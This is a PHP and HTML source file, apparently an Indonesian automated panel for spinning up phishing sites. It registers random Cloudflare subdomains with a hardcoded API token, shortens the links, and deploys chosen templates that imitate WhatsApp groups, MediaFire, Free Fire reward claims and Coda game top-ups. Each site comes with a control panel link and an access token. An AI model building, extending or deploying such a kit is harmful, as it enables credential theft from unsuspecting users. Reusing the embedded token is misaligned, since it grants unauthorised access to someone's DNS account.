<?php

function generateRandomSubdomain($length = 4) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$subdomain = generateRandomSubdomain();
$domain = 'real-ads.my.id';
$zoneId = '6add90ad7cfdabb1cb1296bdb1e28118';

$data = [
    'type' => 'A',
    'name' => $subdomain,
    'content' => '43.153.212.205',
    'ttl' => 1,
    'proxied' => true
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.cloudflare.com/client/v4/zones/'.$zoneId.'/dns_records');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Authorization: Bearer JFlQ9jTTsC88ao4D8hzYiFB9sSlWyVKhGrq5e753',
    'Content-Type: application/json',
]);

$response = curl_exec($ch);
curl_close($ch);

function shortenURL($longURL) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://csd.gxscv.com/add.php?url=".urlencode($longURL));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded'
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

$longURL = $subdomain . '.' . $domain;
$shortURL = shortenURL($longURL);

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <title>Buat Web P - Otomatisイチジク</title>
  <style>
    @font-face {
      font-family: 'ibm';
      src: url('https://saweria.co/ibm-plex-mono-latin-400.woff');
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'ibm';
    }
    body {
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
      background: #E2E8F0;
    }
    .gateway {
      position: relative;
      max-width: 600px;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .gateway span {
      margin-bottom: 20px;
    }
    .gateway .form {
      position: relative;
      width: 100%;
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
      padding: 0 20px;
    }
    .gateway .response {
      position: relative;
      width: 100%;
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      padding: 0 20px;
      margin-top: 30px;
      gap: 10px;
    }
.response {
  padding-left: 5px;
  background: #A0AEC0;
  box-shadow: 0.4rem 0.4rem 0 #222;
  border: 1px solid #000;
  border-radius: 5px;
  margin-top: 10px;
  height: 127px; /* Sesuaikan dengan kebutuhan */
}
    .form label {
      position: relative;
      width: 100%;
      display: flex;
      flex-direction: column;
    }
    label select, label input {
      width: 100%;
      border: 1px solid #000;
      border-radius: 5px;
      height: 30px;
      padding-left: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
    }
    *:focus {
      outline: none;
    }
    .form button {
  padding: 5px 10px;
  margin-top: 20px; /* Atur jarak di sini */
  background: #faae2b;
  box-shadow: 0.4rem 0.4rem 0 #222;
  border: 1px solid #000;
  border-radius: 3px;
}
    .gateway .source {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: #faae2b;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    footer {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .scode {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: #fff;
      height: 100%;
      z-index: 9999;
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .scode textarea {
      margin-top: 20px;
      width: 100%;
      height: 100%;
      padding-left: 5px;
      border-radius: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
    }
    .scode i {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: pink;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    #copyButton {
        position: absolute;
        top: 10px;
        right: 10px;
        padding: 5px 10px;
        background-color: #faae2b;
        border: 1px solid #000;
        border-radius: 3px;
        cursor: pointer;
    }
  </style>
</head>
<body>
<div class="gateway">
  <div class="source">HOME</div>
  <h1><img src="https://j.top4top.io/p_29937hv4d0.png" alt="" style="width: 250px;"></h1>
  <div class="form">
    <label> TAMPILAN
      <select class="aq" id="tampilan">
        <option selected disabled>Pilih terlebih dahulu...</option>
        <optgroup label="Kategori A">
          <option value="A_MediaFire.zip">A_MediaFire</option>
        </optgroup>
        <optgroup label="Kategori B">
          <option value="B_Grup_Wa_Chat_New.zip">B_Grup_Wa_Chat_New</option>
          <option value="B_Grup_Wa_Chat_New2.zip">B_Grup_Wa_Chat_New2</option>
          <option value="B_OpenWa.zip">B_OpenWa</option>
          <option value="B_messenger_grup_bokep.zip">B_messenger_grup_bokep</option>
          <option value="B_WA_4_Bahasa.zip">B_WA_4_Bahasa</option>
          <option value="B_WaChatNew.zip">B_WaChatNew</option>
        </optgroup>
        <optgroup label="Kategori C">
          <option value="D_CODA_FFNew.zip">D_CODA_FFNew</option>
          <option value="K_CodaMLFbMT.zip">K_CodaMLFbMT</option>
        </optgroup>
        <optgroup label="Kategori D">
          <option value="C_FreefireClaim1.zip">C_FreefireClaim1</option>
          <option value="C_FreefireClaim2.zip">C_FreefireClaim2</option>
          <option value="C_FreefireClaim3.zip">C_FreefireClaim3</option>
          <option value="C_FreefireClaim4.zip">C_FreefireClaim4</option>
        </optgroup>
      </select>
    </label>
    <label> SUBDOMAIN
      <input id="subdomain" type="text" class="playerid form-input" value="<?= $longURL ?>" readonly>
    </label>
    <button id="btn">submit</button>
  </div>
<div class="response" style="width: 300px; padding: 10px; border: 1px solid #ccc;">
    <div style="color: black; font-size: 14px;">
        <strong>Control:</strong> <span style="color: red;">(JANGAN SAMPAI HILANG)</span><br>
        <br>
        <strong>Domain:</strong> <a href="https://<?= $longURL ?>/" target="_blank"><?= $longURL ?></a><br>
        <strong>Control Panel:</strong> <a href="https://<?= $longURL ?>/update" target="_blank"><?= $longURL ?>/update</a><br>
        <strong>Token:</strong> 8DLVVNL9
    </div>
    <button id="copyButton" style="position: absolute; top: 0; right: 0;"><i class="fa fa-copy"></i> Salin</button>
</div>
</div>
<footer>
  Crafted By <a href="https://facebook.com/nguyenxwann" style="text-decoration: none;margin: 0 10px"> IwanSter </a> With <img width="20" height="20" src="https://cdn.icon-icons.com/icons2/2699/PNG/512/expressjs_logo_icon_169185.png" style="margin-left: 10px">
</footer>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
  $(document).ready(function() {
    $("#btn").click(function() {
        var domainValue = $("#subdomain").val();
        var selectedValue = $("#tampilan").val();

        var button = $("#btn");
        button.html('Mengirim <i class="fa fa-spinner fa-spin"></i>');
        button.prop('disabled', true);

        setTimeout(function() {
            $(".response").css("display", "block");
            $(".message").css("display", "block");
            button.html('submit');
            button.prop('disabled', false);
        }, 2);

        var message = $(".response .message");
        
        if(selectedValue === "A_MediaFire.zip") {
          var url = "https://real-ads.my.id/step1.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params);
        } else if(selectedValue === "B_Grup_Wa_Chat_New.zip") {
          var url = "https://real-ads.my.id/step2.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params);
        } else if(selectedValue === "B_Grup_Wa_Chat_New2.zip") {
          var url = "https://real-ads.my.id/step3.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params);
        } else if(selectedValue === "B_OpenWa.zip") {
          var url = "https://real-ads.my.id/step4.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params);
        } else if(selectedValue === "B_messenger_grup_bokep.zip") {
          var url = "https://real-ads.my.id/step5.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params);
        } else if(selectedValue === "B_WA_4_Bahasa.zip") {
          var url = "https://real-ads.my.id/step6.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params);
        } else if(selectedValue === "B_WaChatNew.zip") {
          var url = "https://real-ads.my.id/step7.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params);
        } else if(selectedValue === "D_CODA_FFNew.zip") {
          var url = "https://real-ads.my.id/step8.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params);
        } else if(selectedValue === "K_CodaMLFbMT.zip") {
          var url = "https://real-ads.my.id/step9.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params);
        } else if(selectedValue === "C_FreefireClaim1.zip") {
          var url = "https://real-ads.my.id/step10.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params);
        } else if(selectedValue === "C_FreefireClaim2.zip") {
          var url = "https://real-ads.my.id/step11.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params);    
        } else if(selectedValue === "C_FreefireClaim3.zip") {
          var url = "https://real-ads.my.id/step12.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params); 
        } else if(selectedValue === "C_FreefireClaim4.zip") {
          var url = "https://real-ads.my.id/step13.php";
          var params = "subdomain=" + encodeURIComponent('<?= $subdomain ?>') + "&domain=" + encodeURIComponent('<?= $domain ?>');
          sendRequest(url, params); 
        }
    });

    function sendRequest(url, params, message) {
        $.post(url, params, function(data, status) {
            console.log("Respon dari server:", data);
            message.text(data);
        });
    }

    $("#copyButton").click(function() {
        var textToCopy = $(".response").text();
        var textarea = $("<textarea>")
            .val(textToCopy)
            .css({
                position: "fixed",
                opacity: 0
            });
        $("body").append(textarea);
        textarea.select();
        document.execCommand("copy");
        textarea.remove();
        alert("Teks berhasil disalin!");
    });
  });
</script>
</body>
</html>